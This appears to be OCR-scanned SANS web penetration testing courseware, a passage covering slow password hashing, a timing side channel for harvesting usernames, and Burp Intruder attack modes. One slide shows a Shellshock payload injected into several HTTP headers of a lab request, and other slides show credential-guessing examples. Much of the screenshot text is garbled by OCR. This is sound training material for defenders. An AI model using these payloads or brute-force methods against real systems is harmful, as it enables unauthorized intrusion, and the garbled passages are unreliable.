'--'
Timing Attacks 
Historically: Timing attacks based on hashing were difficult to 
measure because most hash algorithms were designed for both 
speed and cryptographic strength 
• MD5, SHA1, SHA2, and so on were built for speed 
In our world, there are two basic uses for hashing: Integrity and 
passwords 
• Integrity hashes should be fast and cryptographically strong 
• Password hashes should be slow and cryptographically strong 
SEC542 I Web App Penetration Testing and Ethical Hacking 
'---' 
'--'
'--../
'--../
'--../
'--../
'--../
'--../ 
'--../
'--../
'-../
'-'
'--'
'-'
'-'
-._,
We need to step back for a bit and describe the two basic uses (in our world) for hash algorithms: Integrity and 
passwords: 
• 
We want both to be cryptographically strong. 
• 
Hashing a file to verify its integrity should also be computationally inexpensive. 
• 
Hashing a password to verify it matches the original should be computationally expensive. 
We describe why on the next page. 
Most systems use cryptographically inexpensive password hashes such as SHAl, MOS, and NTLM. 
Salts add some computational cost but not enough to make a big difference with modem CPUs, GPUs, and 
related breakthroughs in password cracking. 
102 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----
'---'
'---'
'--../
'-.., 
'-' 
'-.., 
\...,
\...,
"- 
"- 
"- 
'-- 
\..., 
'- 
'- 
'--- 
'- 
'-- 
'-- 
'- 
'--- 
'- 
I 
Slow Hashing 
You may be thinking: If my password hashing algorithm is slow, aren't my 
users/CPU penalized for each attempted authentication? 
• Yes! 
• The attacker cracking your hashes is penalized much more 
Strong/slow hashing algorithms such as bcrypt and PBKDF2 are now gaining 
steam for this reason: 
• As of PHP version 5.5, bcrypt is PHP's default hashing algorithm 
Recent cracking comparison: 
• MD5: 180 billion password hashes cracked per second 
• bcrypt: 71 thousand password hashes cracked per second 
• -2.5 million MD5 hashes could be cracked for every 1 bcrypt hash 
103 
Slow password hashing algorithms are the reverse of the old maxim: I don't have to outrun the bear, I just have 
to outrun you. 
The hash cracking rig referenced above used the following: 
• 
Five 4U servers 
• 
25 AMO Radeon GPUs 
• 
l Ox HD 7970 
• 
4x HD 5970 (dual GPU) 
• 
3x HD 6990 (dual GPU) 
• 
lx HD 5870 
• 
4x SOR Infiniband interconnect 
• 
7kW of electricity2 
References: 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
103 
'-J 
'--' 
Practical•• Side-Channel Timing Attack 
• Use of slow hashing algorithms such as bcrypt results in a 
measurable difference when the application uses this logic: 
o Good username: Hash the password; return error if wrong password 
o Bad username: Immediately return error 
• This logic is common in web applications and often overlooked 
during mediocre web application penetration tests 
• You will demonstrate this risk in the next lab 
\_,; 
'--' 
'-' 
'-J 
,._,, 
'-.J 
'--.../ 
'-./
'-' 
'-../ 
'--' 
'-' 
'-J
'--' 
.__,, 
Use of slow password algorithms (along with other controls, such as strong password requirements) significantly 
mitigates the risk of password cracking, and use of slow password hashes is now considered a best practice. 
There is one potential implementation error, which is quite common: Immediate error for bad usemame/bad 
password and a small (but noticeable and measurable) delay returning an error for a good username/ bad 
password. Modem interception proxies such as ZAP and Burp make this timing difference quite easy to 
measure. 
The solution is simple: Hash the password in both use cases, for both good usemames and bad. Although simple 
to accomplish, that design is not common (currently). These flaws typically go undiscovered by many web 
application penetration testers, which provides opportunity for us. 
104 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-...,
'---'
'----' 
'---'
'-'
'----' 
'----' 
'-...,
'----'
'----' 
'-
'-...., 
'-----
'---' 
'-
'- 
'-----
'- 
'-----
'-
'-----
'-----
'-
'-
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
l, Exercise: Gathering Server Information 
J. Testing Software Configuration 
4. Shel!shock 
S. Ex.erdse: She!lshock 
6. Spidering 
Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuzzing 
I I • Information leakage 
12. Exerdse: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. Us;;;rname H::i.rv,~<.tins, 
16. Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19.Summary 
SEC542 [Web App Penetration Testing and .Ethical Hacking 
Course Roadmap 
Next up: The final exercise of 5422: Usemame harvesting. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
105 
'-.__/ 
'-../ 
SEC::542 Workbook: Username Harvesting 
m 
Exercise 2.7: Username Harvesting 
SEC542 f Web App Penetration Testing and Ethical Hacking 
106 
'-.__/
'-.__/ 
'---' 
'-../ 
'-.__/ 
'-../ 
' •. _ _,,/ 
'---' 
'---'
'---' 
'---' 
'---'
'---'
'-.__/
'---'
\..._..; 
SEC542 Workbook: Username Harvesting 
'-..../
'--"
Please go to Exercise 2.7 in the 542 Workbook. 
\..._..; 
'-.__/ 
'-..../ 
'---'
'-' 
\..._..; 
'-../ 
'-' 
'--" 
'---' 
'---' 
\..._..; 
'---' 
'-' 
'-' 
'---' 
\,_, 
106 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Infoemation 
3. 
So1ftware Configuration 
4.Shellshock 
5. Ex.erdse:.She!lshodt 
6. Spidering Web Applications 
7, Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise; ZAP Forced Browse 
10. Fuzzing 
I I. Information Leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. IJsername Harvesting 
16. Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19. Summary 
SEC542jWebA;pl"eneri'iiti;n Testi~g and Eiliical H~Jking 
101 
Course Roadmap 
In the final section of 542.2 we will discuss the Burp Intruder, coming next. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
107 
'-' 
Fuzzing with Burp Intruder 
• Intruder is one of Burp's 'killer 
features' 
• It can automatically discover 
fuzzable values 
o Others may be added manually 
• Intruder operates in four modes: 
o Sniper 
o Battering Ram 
o Pitchfork 
o Cluster Bomb 
• We will discuss each mode next 
cc.,-..figure tfw cosecns wbere P'-',~<Jds wW be in;,.e-ts:J ht<: tf!E'- bace revt•,;t Th!' auao; wee 
deteersces me w,;,;h"'1'tch ~o.WS ar~ tM.i~d t;;Jpa--110.WPQ::.iwru. .,;;#e t-wlp 1i:x1u11 ~ - 
.Qt,..)tk t'iPei [,~Sn~;,c..
··,t_, ~---- 
,:·s_t~r'l att~t-k""': 
~o\ddi- _j 
c1;;~rf 
i 
···- Ai.Ito§ 
; 
_ Reir-esh 
O matcnes 
, 
C~nr 
,s p.a.yioad pe>$lt1ons 
~.enqth ; 586 
108 
'--' 
v 
'-..,I 
'--'
'-.../
'-.../ 
'-../ 
'-..,I 
'-.../
'-' 
'-..../
.____, 
'-../ 
'---' 
'-' 
'-../ 
Burp Intruder is one of Burp's strongest features: 
'-J 
'-' 
Performing fuzzing of application requests to identify common vulnerabilities, such as SQL injection, 
cross-site scripting, and buffer overflows. 
• Enumerate identifiers used within the application, such as account numbers and usernames. 
• 
Deliver customized brute-force attacks against authentication schemes and session handling 
mechanisms. 
• 
Exploit bugs such as broken access controls and information leakage to harvest sensitive data.from the 
application. 
Perform highly customized discovery of application content in the face of unusual naming schemes or 
retrieval methods. 
Carry out concurrency attacks against race conditions, and application-layer denial-of-service attacks. 1 
The screenshot on the slide above shows the initial fuzz positions automatically determined by Burp Intruder for 
this URL: http://mutillidae/index.php?page=login.php. 
While Intruder does a great job of automatically identifying fuzzable fields, you may also add fields manually. 
One common example is HTTP headers: Burp will ignore these unless there are obvious parameters set (such as 
cookie values), but you may easily add any header. We did this for the Battering Ram example coming up 
shortly. 
Reference: 
[ 1] https://portswigger.net/burp/intruder.html (https://cyber.gd/542 _ 250) QR 
'-.../ 
'-..,I 
'--' 
'-' 
'-../ 
'-' 
'--' 
'--' 
'--' 
'-..., 
'-..., 
'--' 
'-- 
'-- 
'-- 
"-- 
'- 
108 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'- 
"-- 
Burp Intruder - Sniper 
• 
• 
Sniper injects one payload value at a time into one field at a time 
For example, password guessing with a dictionary file 
o If the password dictionary has 25 lines, Sniper will send 26 requests 
o The extra request (number o) simply repeats the original request (with no changed values), to 
establish a baseline 
fiai~B.~!*i,_;,[_P;;;i~ !Option<) , ... 
i1J Pavioad Posttfcoe 
1··st.~rtaltl(i.i 
Codigore the poz.i'tions wrere pa:,'k)ad$ wm be inserted into the base reque--,.,t The attack type determines 
the w&t !r. whii:;h pay\Oads are- assigned to pa)10ad positions • see help tor tuU detens. 
Attad:.type: '-S_r) ... 
ti>'e_, 
~----~--------=-~.=3 
I
PQSi /t:'.°!rl!'~ . .autJl/t>HJFLphp Hi-:'P/1. l 
i,.l 
r<(!St: '<ht-¥.~'!!c-542.0M 
!tiSe-r·.;,q:,;nt: Mo!l.th/$,(1 {XU; Lt.,untu; Liraio; J685; n:$1.0} G!ick("i/20100101 ~Jr~fe)(f5.t.O 
I
Ac,,:.,p-::.:, t.nr:ht. •.L"P~. h.::.,n·'..1ct1/)(ht:rd"'-. ,;r,l., •. "" 
r.·;,.ml.;qrtV',9-, •1•;,,.,0.z 
'i 
!.c,:,;,pt- ,_;mquaJe: 
;.:n- ,5,sn;q::0,S 
Ao::<.:'l'pt•Z11rndw(J: gzrn. sfo-tlnt@ 
gefe-er : r,\t1t,l~.1,~,~~<.s'l~.c,r9/h:;,r~_;11.,:t,..,/form_"mtn,ni:~l 
connec t rcn: ctcse 
l
l~gr·act~v l!')'}'°'Cur-e,&-qs.te~t'S~ 
l 
~:~::~; ~:~;;h'."i~>< . .tscnt,-,w, +c-m- c, Iencoded 
u~e=<:?:r;tW,aS:'ll.,,..l1:0flAJutt·,:,m,-t.0>glfl 
~ 
Clear§ 
..... , 
O .retcnes 
i 
Clear 
109 
The next lab will use Sniper to perform a password guessing attack and inject a series of payload values into the 
'pass' variable highlighted above. We will provide a file containing 25 passwords, and Sniper will send 26 
requests (repeating the initial request, without fuzzing any values, as shown in the screenshot below). The user 
and button fields will remain unchanged. 
The screenshot above uses Sniper to fuzz this URL: 
http://www.sec542.org/form _ auth/form _ auth.html 
The input source used in the upcoming lab is located in /opt/wordlists/splashdata-worst-passwords-2016.txt 
1Sii.tlis~ror 
200 
,j 
, Timeou: , Length 
0 
·s~2 
comment 
lOO 
200 
L. 
/,.,,....-- .. , ...... 
=:!::~;=~~;~:~~n.php HTTP/1.l 
UtH· ..:.Q1:nt: "bz::.. ll-1/~.o (x.11; !Jburitu; unu:-.: 1686; n1 :51. Oi Go?cko/20100101 Firefox/51.0 
.'.ccwpt: tut/ht•l..1cplic.ation/xht11lf:r•l • .app 1.ic,ation/Hl;q:::::O.Q, ..-; ... ; q:::O.? 
Accept· L,,m9~1ag~: ~n- US,••~;q=O. 5 
:~:~!~7n~~;~ ~; ;w:.:~:~c~:~~::/form_auth:forcm _auth .html 
Ccrmec t i en: c lose 
~~r•d~- ln·.::•cL1r.,,Raq;.1e:1,U: l 
ce-rtent . Type: ,1pplicat:..on!:c--..,>1W· f or-e-ur l encoded 
Content- tcr.gth: 33 
.. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
109 
\..../ 
\..../ 
1'urp Intruder - Battering Ram 
• Battering Ram injects one input source into multiple fields simultaneously 
• For example, we can use Battering Ram to inject Shellshock exploits into multiple fields 
simultaneously, to see if any trigger 
o In this case, two requests will be sent 
o Base request (unchanged), plus the Shellshock attack in five fields simultaneously 
CcniQlcW• the- pcscons •h!!!nt p-,,1011d• wi11 b-• ir,~-ert~d into th~ be,;,e n1qut"s;.t. TI)• -.tti,.d;. t-,,p~ deti:l'O-nine, tt-,• 
Wirf in wnich Pt'J,1o;ads t1re ;r,s$gnea to p.;~o•d posjtons -- $!!'• he~ tor tuil details 
/ start att~ek i 
'---' 
\..../ 
\..../ 
"-.../ 
'-..../ 
'-.../ 
\..../ 
"-.../ 
\..../ 
Let's revisit Shellshock since it helps illustrate a typical use case for Burp Intruder's Battering Ram. In the 
previous Shellshock exercise, we simply used the User-Agent field for our exploit, since our experience shows 
that's a reliable way to trigger the exploit. Also, it's easy to change the User-Agent via command-line tools such 
as curl. 
But it's fair to ask: How could you determine which field to use, without knowing ahead of time? Battering Ram 
offers one way. We'll simply try all fields that won't break the request (so we can't change the GET). Ifit works 
(as it did in the screenshot below), we know at least one field worked, but we don't (yet) know which. We can 
later use Sniper to inject each field one at a time, to see which are vulnerable. We will describe this technique in 
more detail during 542.4. 
For the Battering Ram results example shown below, we unchecked "URL encode these characters ... " and 
added the following under "Payload Option (Simple List)": () 
{ 42; } ; echo; /usr /bin/ id 
GET /cgi -bin/netstat.cg1 HTTP/1. 1 
Host: ,.,..,.,,sec~2.orQ 
User-Agent: () { 42;};echo;/usr/b1n/1d 
Accept: () { 42;} ;•cho;/usr/b1n/1d 
Acce,:,t-Langc,•ge: 0 { 42;} ;gcho;Ju,r/bin;1d 
Accept-Encoding: [) { 42;}; echo;/usr /bin/1d 
Ref ere; () { 42;} ;echo;/u$r/bin/id 
Connection: cloS$ 
Upgrade~!nsocure-R~quests: l 
110 
O matches 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'--' 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-' 
\..../ 
\..../ 
\..../ 
\..../ 
'-' 
\..../ 
\..../ 
'-.../ 
\..../ 
'--../ 
\..../ 
'--../
\..../ 
"-.../ 
'--../
'--" 
'--" 
'----'
'----' 
\..../
'-'
Burp Intruder - Pitchfork 
• Burp Intruder's Pitchfork injects multiple payload 
sets into multiple values 
o Unlike Clusterbomb (discussed next), Pitchfork uses 
matched sets 
• For example, assume you have a list of matched 
Usernames and UserIDs1 (shown on the right) 
• Pitchfork will inject: 
ousername=adent&userid=l042&page=transfer.php 
ousername=zbeeblebrox&userid=l067&page=transfer.php 
adent 
zbeeblebrox 
marvin 
tmcmillan 
ousername=marvin&userid=1082&page=transfer.php 
ousername=tmcmillan&userid=1099&page=transfer.php 
1042 
1067 
1082 
1099 
Pitchfork requires two or more matched pairs of inputs, as shown above. It is the least-used Intruder attack type, 
since attacks requiring matched sets of different inputs certainly exist, but are less common than other attacks 
we use Sniper, Battering Ram, and Cluster Bomb for. 
Portswigger describes Pitchfork: 
Pitchfork- This uses multiple payload sets. There is a different payload set for each defined position 
(up to a maximum of 20). The attack iterates through all payload sets simultaneously, and places one 
payload into each defined position. in other words, the first request will place the first payload from 
payload set 1 into position 1 and the first payload from payload set 2 into position 2; the second 
request will place the second payload/ram payload set 1 into position 1 and the second payload/ram 
payload set 2 into position 2, etc. This attack type is useful where an attack requires different but 
related input to be inserted in multiple places within the request (e.g. a username in one parameter, 
and a known JD number corresponding to that username in another parameter). The total number of 
requests generated in the attack is the number of payloads in the smallest payload set. 2 
Reference: 
[1] https://portswigger.net/burp/help/intruder _positions.html (https://cyber.gd/542 _ 253) QR 
[2] Ibid. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
111 
'-- 
'--
Burp Intruder - Cluster Bomb 
• Cluster Bomb injects multiple payload sets into multiple values 
o It will try every combination of payloads 
• For example, assume two payload sets: Usernames and passwords 
• Cluster Bomb will fuzz (see notes for screenshot): 
o username=adent&password=towel&Login=Login 
adent 
towel 
o username=zbeeblebrox&password=towel&Login=Login zbeeblebrox 
panic 
o username=marvin&password=towel&Login=Login 
marvin 
harmless 
ousername=adent&password=panic&Login=Login 
ousername=zbeeblebrox&password=panic&Login=Login 
ousername=marvin&password=panic&Login=Login 
ousername=adent&password=harmless&Login=Login 
ousername=zbeeblebrox&password=harmless&Login=Login 
ousername=marvin&password=harmless&Login=Login 
SEC542 J.WebApp PenetrationTestingand Ethical Hacking 
111 
'---" 
'---"
'-'
'---" 
____, 
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
'---"
'---"
Cluster Bomb is quite useful, especially for username and password guessing, as shown above. It tries all 
combinations of payloads. 
In the example above, we have three usernames and three passwords. Cluster Bomb will make 3 x 3 requests, 
plus one for the base request, or 10 requests total. 
This screenshot shows a Cluster Bomb vs. http://dvwa/login.php. Note that Burp cycles through each password 
(2nd payload) in order: The first password (towel) for three users, then the second password (panic), etc. 
2 
3 
4 
5 
6 
7 
*'I 
112 
Payload2 
i Error 
' 
adent 
zbeebtebrox 
marvin 
adent 
zbeeetebrox 
marvin 
adent 
zbeebleerox 
rnarvin 
towel 
towel 
towel 
panic 
panic 
panic 
harmless 
harmless 
harmless 
302 
302 
302 
302 
302 
302 
302 
302 
302 
302 
0 u 
0 
0 
C 
0 
LJ 
0 
0 
0 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-.../ 
'-.../ 
'- 
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
'-'
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
'---" 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
:t Exercise: L.an,,,,,...,,a Server Information 
l. Testing Software Configuration 
4 •. Shellshock 
5. Exercise: Sheli1,lhc,ck 
6. Spidering Web Applications 
7. Exercise; Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuzzing 
l l. Information '-""""'~ll"' 
! 2. Exercise: Directory Browsing 
13. Authentication 
!4. Exerdse: Authentication 
I S. Username H;,,nr,•«t:in<> 
I b, Exercise: Username Harvesting 
11. Burp lntrm:l{)lr 
Exercise: Frnn:iri,,, with Burp Intruder 
Summary 
SEC542 I WebApp Penetration Testing and Ethical Hacking 
J 13 
Course Roadmap 
The next exercise provides a hands-on demonstration of the Burp Suite's Intruder. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
113 
'-" 
SEC542 Workbook: Fuzzing with Burp Intruder 
(I 
Exercise 2.8: Fuzzing with Burp Intruder 
SEC542 I Web App Penetration Testing and Ethical Hacking 
11• 
'-"' 
'-.../ 
'-..,/
'-.../ 
'-" 
'-.../ 
'-" 
\._J 
'-" 
\._J 
'-" 
'-" 
'----' 
'-" 
'-J 
'----' 
SEC542 Workbook: Fuzzing with Burp Intruder 
\._J 
'-" 
Please go to Exercise 2.8 in the 542 Workbook. 
'-" 
\._J 
. ..__,, 
'-" 
'-' 
'-" 
'-..../ 
'-" 
'----' 
~ 
'----' 
'-' 
'-..,I 
'-" 
'-..,I 
'-J 
'-.../ 
'-..,/ 
114 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-.../ 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with 
l. Exercise: Gathering Server Information 
3, Testing Software Configuration 
4. Shellshock 
S. Exercise: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing .Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuz:;dng 
I ! . Information Leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
IS. Username Harvesting 
16. Exercise: Username H"'"""'"f'i.1r>o 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19. Summary 
SEC542 
Course Roadmap 
That wraps up 542.2! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
115 
Summary 
• Thank you; that wraps up 542.2 
• Today we have used Nmap, exploited the Shellshock vulnerability, 
spidered websites, explored fuzzing with both Burp and ZAP, 
learned about major web authentication methods, and exploited a 
side-channel attack to harvest usernames 
oAndmore 
• Next up: 542.3, which provides a deep dive on injection 
techniques 
o See you then! 
SEC542 I Web App Penetration Testing and Ethical Hacking 
116 
'-' 
'-' 
.._, 
\.._., 
.._, 
'-' 
'-../ 
.._, 
.._, 
.._, 
.._, 
\.._., 
'-../ 
'-../ 
.._, 
\.._., 
Thank you; that wraps up 542.2. 
'-../ 
.._, 
Today we have used Nmap, exploited the Shellshock vulnerability, spidered websites, explored fuzzing with 
both Burp and ZAP, learned about major web authentication methods, and exploited a side-channel attack to 
harvest usemames. 
Next up: 542.3, which provides a deep dive on injection techniques. See you then! 
116 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.._., 
.._, 
\.._., 
.._, 
.._, 
'-../ 
.._, 
.._, 
.._, 
.._, 
.._, 
.._, 
\.._., 
\.._., 
'-' 
'-' 
.._, 
'---' 
.._, 
'---' 
- 
- 
~ 
- 
- 
- 
-~ 
~ 
- 
- 
- 
- - -- sa:sa I wm.:PP PENEl"R.A:T'ION l"ESmlNG cA.ND En,,IIG.:E tt.:GR.ING 
I 
0 
'-_.} 
Copyright© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson. All rights reserved to Seth Misenar, Eric 
Conrad, Kevin Johnson, and/or SANS Institute. 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
SEC542 3 D01 01 
- - 
- 
'--' 
'-_.} 
'--' 
'-../ 
.'-../ 
'-../ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--./ 
'--" 
'--./ 
'--./ 
'--' 
'--" 
'--./ 
'--./ 
'---' 
'--" 
'-" 
'-" 
'--' 
'--./ 
'-" 
'--' 
'-" 
'-.../ 
._____,, 
._____,, 
'-.../ 
'--./ 
'-.../ 
-./ 
SEC542.3 
s 
Injection 
Copyright 2018 Seth Misenar (GSE #28), Eric Conrad (GSE # 13), Kevin Johnson 
Version DO I_ 0 I 
Welcome to SANS Security 542, Day 3! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----' 
'-._,; 
SEC660 
Advanced Penetration 
& Ethical Hacking 
SEC760 
Advanced Exploit Develop 
for Penetration Testers 
vice Security 
& Ethical Hacking 
Wireless. Penetration Testing 
and Ethical Hacking 
Social Engineering 
for Penetration Testers 
\-...J 
'----' 
,._,, 
,._,, 
,._,, 
,._,, 
'---' 
,._,, 
,._,, 
5EC573 
Automating Information 
Security with Python 
This slide shows the SANS Penetration Testing Curriculum, offering a variety of courses all focused on 
helping organizations improve their security through the use of penetration testing, vulnerability analysis, and 
Red Teaming. 
2 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
,._,, 
'-./ 
'---' 
'-./ 
'-" 
'---" 
'---' 
'---' 
'-._/' 
'---" 
'--" 
'-" 
\._, 
'-./ 
'---' 
\._,/ 
'--' 
'---" 
'--' 
'-./ 
'---' 
'--' 
~- 
"-'' 
'-- 
Table of Contents 
Ill 
Session Tracking 
. 
Session Token Gathering and Session Fixation 
. 
Bypass Flaws 
. 
EXERCISE: Authentication Bypass 
. 
,_...__ 
Vulnerable Web Apps: Mutillidae 
. 
-----+----- 
Command Injection 
. 
EXERCISE: Command Injection 
. 
File Inclusion and Directory Traversal 
. 
EXERCISE: Local/Remote File Inclusion 
. 
5 
14 
25 
28 
30 
36 
41 
43 
51 
SQL Injection Primer.......................................................................................... 
53 
Discovering SQLi. 
. 
EXERCISE: Error-Based SQLi. 
. 
71 
93 
SEC542JWebApp Penetration Testing and Ethical Hacking 
J 
542.3 Table of Contents 
This table of contents outlines our plan for 542.3. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
3 
'--' 
'-" 
'---' 
Table of Contents 
Exploiting SQLi 
. 
SQLiTools 
. 
EXERCISE: sqlmap + ZAP. 
. 
Ill 
95 
117 
134 
Summary.......................................................... . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .. . . . . . . . . . . 
136 
SEC542 [Web App Penetration Testing and Ethical Hacking 
'-../ 
'-----' 
'-.,/ 
'-' 
'-" 
'-.,/ 
'----' 
'-' 
'-.,/ 
'-' 
.__, 
'-----' 
'-----' 
'-.,/ 
542.3 Table of Contents 
'-" 
'-../ 
Here is the rest of the Table of Contents for 542.3. 
'-----' 
'-" 
'-' 
'-.,/ 
'-" 
'-.,/ 
'-----' 
'----' 
'-----' 
'-' 
"'-.,/ 
'---- 
'-' 
'-' 
.__, 
'-.,/ 
'-.,/ 
'-../ 
4 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
2. Se1sion Fixation 
3. Bypass Flaws 
:.t. Exercise: Authentication Bypass 
5. Yulnerable Web Apps:: Mutillidae 
6. Command Injection 
7. Exercise: Command lnjeetion 
I!. liile Inclusion and Directory Traversal 
9. Exer:cise: Local/Remote File Inclusion 
I 0. SQL Injection Primer 
i I. Discovering SQLi 
I 2. Exercise: Error-Based SQLi 
13.E 
SQLi 
14. 
,, 
I S. Exercise: sqlmap + ZAP 
16.Summary 
Course Roadmap 
Welcome to Security 542, Web App Penetration Testing and Ethical Hacking: Day 3. 
Today we will discuss injection. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
5 
'---' 
'---' 
~tateless as a.Way QfLife 
HTTP is stateless 
• The application must implement a method for grouping a series of requests 
together in a session 
• The application implements a state tracking mechanism 
Server-side code has to identify that each request is part of the same 
session 
• Most languages have built-in support for sessions 
• Some developers "roll" their own session-tracking code 
\.....-' 
'---' 
'---" 
'-' 
'---" 
'-' 
'-.../ 
'-.../ 
'-' 
'-' 
'-' 
'-' 
'---' 
'-' 
'-' 
'---" 
'-' 
HTTP is a stateless protocol. This means that the application must maintain a method of identifying requests as 
being part of the same session. 
Servers must have a way to identify individual requests as being part of a longer session. Otherwise, many 
applications would not be able to keep track of the data used to provide functionality. 
Most web languages have built-in session management, and these are the recommended ways to maintain a 
session state. They have been tested, and when errors are found, mostly, they are fixed. When developers get 
